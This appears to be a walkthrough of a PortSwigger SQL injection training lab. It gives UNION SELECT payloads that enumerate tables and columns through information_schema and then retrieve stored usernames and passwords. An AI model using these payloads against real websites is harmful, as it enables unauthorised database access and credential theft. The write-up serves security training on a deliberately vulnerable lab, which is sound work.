## Lab Description
![image](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/699d1c82-b330-4136-8d0c-904dd815312b)

Determine the number of columns that are being returned by the query and which columns contain text data. 

  - Use the following payload to retrieve the list of tables in the database:
`'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`
 
![1](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/d6de7b78-347d-45fb-8da5-f723ecefec9e)

 - retrieved table:

![2](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/13f076c0-7e3f-466e-ad25-675c985023a9)


  - Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

`'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`

![3](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/51fa6a82-8a0f-415b-a0df-4015b3abd76c)

  - Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

`'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--`

![4](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/61bad9bc-19bd-4aa4-957e-ebe44a4b88c1)

Retreived the passwords for administrator and users.

![5](https://github.com/rahulr98/Portswigger_LABs/assets/116432525/776965cb-0729-4ae9-b478-f48ab751c291)
